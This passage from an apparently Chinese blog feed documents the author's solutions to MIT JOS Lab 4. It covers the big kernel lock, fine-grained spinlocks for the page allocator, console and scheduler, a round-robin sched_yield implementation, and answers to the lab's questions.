c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="type">uint32_t</span> *addr, <span class="type">uint32_t</span> newval)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> result;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The + in &quot;+m&quot; denotes a read-modify-write operand.</span></span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lock; xchgl %0, %1&quot;</span></span></span><br><span class="line"><span class="params">     : <span class="string">&quot;+m&quot;</span> (*addr), <span class="string">&quot;=a&quot;</span> (result)</span></span><br><span class="line"><span class="params">     : <span class="string">&quot;1&quot;</span> (newval)</span></span><br><span class="line"><span class="params">     : <span class="string">&quot;cc&quot;</span>)</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>现在你知道一个自旋锁该怎么实现了吧 ；）那么互斥锁呢？互斥锁的实现其实需要依赖额外的辅助结构…</p></blockquote><p>这里 <code>lock_kernel()</code> 和 <code>unlock_kernel()</code>直接操作的就是大内核锁，所以我们直接将其放置在对应位置即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">i386_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Acquire the big kernel lock before waking up APs</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line">lock_kernel();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Setup code for APs</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">mp_main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// We are in high EIP now, safe to switch to kern_pgdir </span></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line">cprintf(<span class="string">&quot;SMP: CPU %d starting\n&quot;</span>, cpunum());</span><br><span class="line"></span><br><span class="line">lapic_init();</span><br><span class="line">env_init_percpu();</span><br><span class="line">trap_init_percpu();</span><br><span class="line">xchg(&amp;thiscpu-&gt;cpu_status, CPU_STARTED); <span class="comment">// tell boot_aps() we&#x27;re up</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Now that we have finished some basic setup, call sched_yield()</span></span><br><span class="line"><span class="comment">// to start running processes on this CPU.  But make sure that</span></span><br><span class="line"><span class="comment">// only one CPU can enter the scheduler at a time!</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line">lock_kernel();</span><br><span class="line">    sched_yield();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove this after you finish Exercise 6</span></span><br><span class="line"><span class="keyword">for</span> (;;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="comment">// Trapped from user mode.</span></span><br><span class="line"><span class="comment">// Acquire the big kernel lock before doing any</span></span><br><span class="line"><span class="comment">// serious kernel work.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">assert(curenv);</span><br><span class="line">lock_kernel();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_run</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// recover the context of process and ret2usr</span></span><br><span class="line">    unlock_kernel();</span><br><span class="line">lcr3(PADDR(curenv-&gt;env_pgdir));</span><br><span class="line">env_pop_tf(&amp;curenv-&gt;env_tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// we never arrive there</span></span><br><span class="line">panic(<span class="string">&quot;env_run not yet implemented&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是习题 time：为什么有了大内核锁我们还要为每个 CPU 分配一个独立的内核栈？</p><blockquote><p><strong>Question</strong></p><ol><li>It seems that using the big kernel lock guarantees that only one CPU can run the kernel code at a time. Why do we still need separate kernel stacks for each CPU? Describe a scenario in which using a shared kernel stack will go wrong, even with the protection of the big kernel lock.</li></ol></blockquote><p>我们在从用户态陷入到内核态再到获取到锁中间仍有一段需要压栈的过程，因此若多个用户进程同时陷入内核态则会破坏掉内核栈上保存的属于其他用户进程的栈帧</p><p>之后是 Challenge，为四个地方加上锁：</p><blockquote><p><em>Challenge!</em> The big kernel lock is simple and easy to use. Nevertheless, it eliminates all concurrency in kernel mode. Most modern operating systems use different locks to protect different parts of their shared state, an approach called <em>fine-grained locking</em>. Fine-grained locking can increase performance significantly, but is more difficult to implement and error-prone. If you are brave enough, drop the big kernel lock and embrace concurrency in JOS!</p><p>It is up to you to decide the locking granularity (the amount of data that a lock protects). As a hint, you may consider using spin locks to ensure exclusive access to these shared components in the JOS kernel:</p><ul><li>The page allocator.</li><li>The console driver.</li><li>The scheduler.</li><li>The inter-process communication (IPC) state that you will implement in the part C.</li></ul></blockquote><p>第四个在 part C 才实现，我们先看前三个</p><p>首先是 page allocator，我们在这里声明一个全局的锁变量，在 <code>page_init()</code> 中对其初始化，并在 <code>page_alloc()</code> 与 <code>page_free()</code> 中都加入对该锁的使用，这里笔者选择为这两个函数再添加一层 wrapper 来使用锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// spinlock for page allocator</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">page_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 6) init page_lock</span></span><br><span class="line">__spin_initlock(&amp;page_lock, <span class="string">&quot;page allocator lock&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class">__<span class="title">page_alloc</span>(<span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> PageInfo *</span><br><span class="line"><span class="title function_">page_alloc</span><span class="params">(<span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">res</span>;</span></span><br><span class="line"></span><br><span class="line">spin_lock(&amp;page_lock);</span><br><span class="line">res = __page_alloc(alloc_flags);</span><br><span class="line">spin_unlock(&amp;page_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__page_free(<span class="keyword">struct</span> PageInfo *pp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_free</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span></span><br><span class="line">&#123;</span><br><span class="line">spin_lock(&amp;page_lock);</span><br><span class="line">res = __page_free(pp);</span><br><span class="line">spin_unlock(&amp;page_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>console driver 其实也是同样的思路，不过笔者分为读和写两个锁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">read_lock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">write_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize the console devices</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">cons_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">cga_init();</span><br><span class="line">kbd_init();</span><br><span class="line">serial_init();</span><br><span class="line"></span><br><span class="line">__spin_initlock(&amp;read_lock, <span class="string">&quot;console read lock&quot;</span>);</span><br><span class="line">__spin_initlock(&amp;write_lock, <span class="string">&quot;console write lock&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!serial_exists)</span><br><span class="line">cprintf(<span class="string">&quot;Serial port does not exist!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">cputchar</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">spin_lock(&amp;write_lock);</span><br><span class="line">cons_putc(c);</span><br><span class="line">spin_unlock(&amp;write_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;read_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((c = cons_getc()) == <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* do nothing */</span>;</span><br><span class="line"></span><br><span class="line">spin_unlock(&amp;read_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>scheduler 现在还没有写呢，所以👴选择摸了</del></p><h3 id="Round-Robin-Scheduling"><a href="#Round-Robin-Scheduling" class="headerlink" title="Round-Robin Scheduling"></a>Round-Robin Scheduling</h3><blockquote><p>关于这个算法，笔者在<a href="https://arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/#%E5%85%B3%E4%BA%8E%E8%BD%AE%E8%AF%A2%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B">这篇博客</a>里写了他的来龙去脉</p></blockquote><p>接下来我们需要实现 <em>轮询调度算法</em> ：</p><ul><li><code>sched_yield()</code> 用以从遍历 <code>envs[]</code> 数组并选择第一个状态为 <code>ENV_RUNNABLE</code> 的进程去运行</li><li><code>sched_yield()</code> 不应当让一个进程被同时跑在两个 CPU 上</li><li>JOS 还实现了一个新的系统调用 <code>sys_yield()</code> 以让当前用户进程休眠，使当前 CPU 去运行另一个进程</li></ul><p>接下来是 Exercise 6 了，在 <code>sched_yield()</code>  中实现轮询调度算法：</p><blockquote><p><strong>Exercise 6.</strong> Implement round-robin scheduling in <code>sched_yield()</code> as described above. Don’t forget to modify <code>syscall()</code> to dispatch <code>sys_yield()</code>.</p><p>Make sure to invoke <code>sched_yield()</code> in <code>mp_main</code>.</p><p>Modify <code>kern/init.c</code> to create three (or more!) environments that all run the program <code>user/yield.c</code>.</p><p>Run make qemu. You should see the environments switch back and forth between each other five times before terminating, like below.</p><p>Test also with several CPUS: make qemu CPUS&#x3D;2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Hello, I am environment 00001000.</span><br><span class="line">Hello, I am environment 00001001.</span><br><span class="line">Hello, I am environment 00001002.</span><br><span class="line">Back in environment 00001000, iteration 0.</span><br><span class="line">Back in environment 00001001, iteration 0.</span><br><span class="line">Back in environment 00001002, iteration 0.</span><br><span class="line">Back in environment 00001000, iteration 1.</span><br><span class="line">Back in environment 00001001, iteration 1.</span><br><span class="line">Back in environment 00001002, iteration 1.</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>After the <code>yield</code> programs exit, there will be no runnable environment in the system, the scheduler should invoke the JOS kernel monitor. If any of this does not happen, then fix your code before proceeding.</p></blockquote><p>前面的 Challenge 说到为 scheduler 加锁，因此笔者选择在 <code>kern/env.h</code> 中声明一个自旋锁，定义放在 <code>kern/env.c</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">sched_lock</span>;</span><span class="comment">// lock for Env in scheduler</span></span><br></pre></td></tr></table></figure><p>在 <code>env_init()</code> 中对其初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize the scheduler lock</span></span><br><span class="line">__spin_initlock(&amp;sched_lock, <span class="string">&quot;scheduler lock&quot;</span>);</span><br></pre></td></tr></table></figure><p>最后就是实现 <code>sched_yield()</code> 了，这里为了保证公平因此我们应当从当前进程往后进行遍历而不是每次都从 env[0] 开始，需要注意的是若我们轮询一遍进程数组发现没有其他可运行进程的话需要返回到发起 yield 的进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Choose a user environment to run and run it.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sched_yield</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">idle</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Implement simple round-robin scheduling.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Search through &#x27;envs&#x27; for an ENV_RUNNABLE environment in</span></span><br><span class="line"><span class="comment">// circular fashion starting just after the env this CPU was</span></span><br><span class="line"><span class="comment">// last running.  Switch to the first such environment found.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If no envs are runnable, but the environment previously</span></span><br><span class="line"><span class="comment">// running on this CPU is still ENV_RUNNING, it&#x27;s okay to</span></span><br><span class="line"><span class="comment">// choose that environment.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Never choose an environment that&#x27;s currently running on</span></span><br><span class="line"><span class="comment">// another CPU (env_status == ENV_RUNNING). If there are</span></span><br><span class="line"><span class="comment">// no runnable environments, simply drop through to the code</span></span><br><span class="line"><span class="comment">// below to halt the cpu.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> i, start_idx;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;sched_lock);</span><br><span class="line"></span><br><span class="line">idle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (curenv)</span><br><span class="line">start_idx = ENVX(curenv-&gt;env_id) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">start_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// traversal envs</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NENV; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (envs[(start_idx + i) % NENV].env_status == ENV_RUNNABLE)</span><br><span class="line">&#123;</span><br><span class="line">idle = &amp;envs[(start_idx + i) % NENV];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no other runnable, try to rerun curenv</span></span><br><span class="line"><span class="keyword">if</span> (!idle &amp;&amp; curenv </span><br><span class="line">&amp;&amp; curenv-&gt;env_status == ENV_RUNNING</span><br><span class="line">&amp;&amp; curenv-&gt;env_cpunum == cpunum())</span><br><span class="line">idle = curenv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idle)</span><br><span class="line">&#123;</span><br><span class="line">idle-&gt;env_status = ENV_RUNNING;</span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line">env_run(idle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line"><span class="comment">// sched_halt never returns</span></span><br><span class="line">sched_halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们的自旋锁还需要保护整个 env 数组，在 <code>env_alloc()</code> 与 <code>env_free()</code> 上套一层 wrapper：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> </span><br><span class="line"><span class="title function_">env_alloc</span><span class="params">(<span class="keyword">struct</span> Env **newenv_store, <span class="type">envid_t</span> parent_id)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;sched_lock);</span><br><span class="line">res = __env_alloc(newenv_store, parent_id);</span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_free</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line">spin_lock(&amp;sched_lock);</span><br><span class="line">__env_free(e);</span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里笔者为了完成加锁的那个 Challenge，走了不少弯路…也掉了几次坑….</p></blockquote><p>别忘了在 <code>kern/syscall.c</code> 中补充上对 <code>sys_yield()</code> 的调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dispatches to the correct kernel function, passing the arguments.</span></span><br><span class="line"><span class="type">int32_t</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">uint32_t</span> syscallno, <span class="type">uint32_t</span> a1, <span class="type">uint32_t</span> a2, <span class="type">uint32_t</span> a3, <span class="type">uint32_t</span> a4, <span class="type">uint32_t</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span></span><br><span class="line"><span class="comment">// Return any appropriate return value.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// panic(&quot;syscall not implemented&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (syscallno) &#123;</span><br><span class="line"><span class="keyword">case</span> SYS_cputs:</span><br><span class="line">sys_cputs((<span class="type">const</span> <span class="type">char</span>*)a1, a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_cgetc:</span><br><span class="line"><span class="keyword">return</span> sys_cgetc();</span><br><span class="line"><span class="keyword">case</span> SYS_getenvid:</span><br><span class="line"><span class="keyword">return</span> sys_getenvid();</span><br><span class="line"><span class="keyword">case</span> SYS_env_destroy:</span><br><span class="line"><span class="keyword">return</span> sys_env_destroy(a1);</span><br><span class="line"><span class="keyword">case</span> SYS_yield:</span><br><span class="line">sys_yield();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后是习题 Time：</p><blockquote><p><strong>Question</strong></p><ol><li>In your implementation of <code>env_run()</code> you should have called <code>lcr3()</code>. Before and after the call to <code>lcr3()</code>, your code makes references (at least it should) to the variable <code>e</code>, the argument to <code>env_run</code>. Upon loading the <code>%cr3</code> register, the addressing context used by the MMU is instantly changed. But a virtual address (namely <code>e</code>) has meaning relative to a given address context–the address context specifies the physical address to which the virtual address maps. Why can the pointer <code>e</code> be dereferenced both before and after the addressing switch?</li><li>Whenever the kernel switches from one environment to another, it must ensure the old environment’s registers are saved so they can be restored properly later. Why? Where does this happen?</li></ol></blockquote><p>两个 Challenge，</p><blockquote><p><em>Challenge!</em> Add a less trivial scheduling policy to the kernel, such as a fixed-priority scheduler that allows each environment to be assigned a priority and ensures that higher-priority environments are always chosen in preference to lower-priority environments. If you’re feeling really adventurous, try implementing a Unix-style adjustable-priority scheduler or even a lottery or stride scheduler. (Look up “lottery scheduling” and “stride scheduling” in Google.)</p><p>Write a test program or two that verifies that your scheduling algorithm is working correctly (i.e., the right environments get run in the right order). It may be easier to write these test programs once you have implemented <code>fork()</code> and IPC in parts B and C of this lab.</p></blockquote><blockquote><p><em>Challenge!</em> The JOS kernel currently does not allow applications to use the x86 processor’s x87 floating-point unit (FPU), MMX instructions, or Streaming SIMD Extensions (SSE). Extend the <code>Env</code> structure to provide a save area for the processor’s floating point state, and extend the context switching code to save and restore this state properly when switching from one environment to another. The <code>FXSAVE</code> and <code>FXRSTOR</code> instructions may be useful, but note that these are not in the old i386 user’s manual because they were introduced in more recent processors. Write a user-level test program that does something cool with floating-point.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如 Windows XP 好用&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="操作系统" scheme="http://blog.arttnba3.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="实验笔记" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="XV6" scheme="http://blog.arttnba3.cn/tags/XV6/"/>
    
  </entry>
  
  <entry>
